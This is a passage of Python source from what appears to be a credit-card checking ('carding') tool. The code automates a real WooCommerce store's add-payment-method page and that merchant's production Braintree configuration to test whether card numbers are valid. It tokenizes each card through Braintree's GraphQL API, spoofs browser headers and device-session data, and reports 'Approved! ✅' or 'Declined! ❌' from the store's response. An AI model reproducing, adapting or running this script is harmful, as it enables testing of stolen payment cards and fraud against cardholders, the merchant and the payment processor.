                },
                'operationName': 'TokenizeCreditCard',
            }
            self.req_3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.nonce_card = BehaviorsBraintree().QueryText(self.req_3.text, '{"token":"', '"')
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bulkmemorycards.com',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"127.0.6533.101"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.101", "Chromium";v="127.0.6533.101"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            }
            self.braintree_cc_config_data = {
                "environment": "production",
                "clientApiUrl": "https://api.braintreegateway.com:443/merchants/z27jgxy24sbwsp5q/client_api",
                "assetsUrl": "https://assets.braintreegateway.com",
                "analytics": {"url": "https://client-analytics.braintreegateway.com/z27jgxy24sbwsp5q"},
                "merchantId": "z27jgxy24sbwsp5q",
                "venmo": "off",
                "graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]},
                "kount": {"kountMerchantId": None},
                "challenges": ["cvv", "postal_code"],
                "creditCards": {"supportedCardTypes": ["MasterCard", "Visa", "Discover", "JCB", "American Express", "UnionPay"]},
                "threeDSecureEnabled": False,
                "threeDSecure": None,
                "paypalEnabled": False
            }
            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': self.nonce_card,
                'braintree_cc_device_data': '{"device_session_id":"48e19565ca386c55a4181d8d9a46f4f2","fraud_merchant_id":null,"correlation_id":"a1aedff4-509e-448c-8cee-7c72eeae"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': f'{self.braintree_cc_config_data}',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            response = self.session.post('https://bulkmemorycards.com/my-account/add-payment-method/', headers=headers, data=data)
            
            self.session.close()
            error = BehaviorsBraintree().QueryText(response.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', 'Charged $1.0'
            else: return BehaviorsBraintree().Response(error[1].split('t method. Reason: ')[1].strip())

        except: 
            self.session.close()
            return 'Declined! ❌', 'Declined - Call Issuel.'